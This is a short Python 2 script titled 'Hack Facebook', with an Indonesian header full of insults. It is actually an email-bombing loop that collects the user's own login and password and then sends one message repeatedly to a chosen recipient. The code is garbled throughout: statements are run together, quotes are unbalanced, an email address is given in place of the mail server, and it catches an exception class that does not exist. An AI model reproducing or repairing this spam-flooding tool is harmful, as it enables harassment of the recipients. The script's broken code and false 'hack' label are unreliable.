#!/usr/bin/python
#Hack Facebook 
#Pliss No Recode Kontol!!!
Gua Cape Mikir Pake Otak Goblog
#Gunakan Dengan Bijak Kontol!!! 


import osimport smtplibimport getpassimport sys print '+=========================+'+  Author : Mr.F3eLL
'+  Facebook : Oh
'+  Team : B.H.I
'+=========================+' 

server = raw_input ('Id Target Kalian Mek : ')user = raw_input('Login Facebook Lu : ')passwd = getpass.getpass('Password : ')


to = raw_input('\nTo: ')#subject = raw_input('Subject: ') body = raw_input('Pesan : ')total = input('Number of send: ') 

if server == 'Facebook ':     
 smtp_server = 'abekaprtm@gmail.com' port = 587
 elif server == 'Gmail:                                          smtp_served'abekaprtm@gmail.com' 
port = 25
 else: print 'Applies only to Facebook and Gmail.' sys.exit()
print '' 

try: server = smtplib.SMTP(smtp_server,port) server.ehlo() 
 if smtp_server == "abekaprtm@gmail.com":   
 server.starttls() 
server.login(user,passwd) for i in range(1, total+1): 
subject = os.urandom(9) msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body server.sendmail(user,to,msg) print "\rE-mails sent: %i" % i 
sys.
stdout.flush() server.quit()
 print '\n Done !!!'
except KeyboardInterrupt: 
 print '[-] Canceled' 
 sys.exit()
except AbekaprtmAuthenticationError: print '\n[!] The username or password you entered is incorrect.' 
 sys.exit()
